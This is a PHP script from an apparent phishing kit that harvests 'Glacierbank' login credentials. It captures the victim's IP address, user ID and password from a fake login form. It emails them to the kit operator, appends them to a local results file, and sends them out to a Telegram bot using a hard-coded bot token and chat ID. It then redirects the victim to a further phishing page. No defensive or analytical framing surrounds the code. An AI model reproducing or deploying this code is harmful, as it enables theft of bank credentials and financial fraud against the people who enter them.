<?php


$ip = $_SERVER['REMOTE_ADDR'];

include('./XEmail.php');

$subject = "Glacierbank LOGIN";
$headers = "From: SuleimanSamar <Glacierbank>\r\n";
$message .= "
+----/!\----<.![+] Glacierbank LOGIN  [+]!.>---/!\----+
 [IP]                 : ".$ip."
 [User Id & VMN]      : ".$_POST['1']."
 [PASSWORD]           : ".$_POST['2']."
-------------------------------------------------\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);


/* Telegram */
function sendMessage($messaggio) {
    $token = '2096606596:AAG5pXX4sotZxew9zWFEtCLMF7T0TzjkvO4';
    $chatid = '1656299190';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: ../Main/Email.html");



?>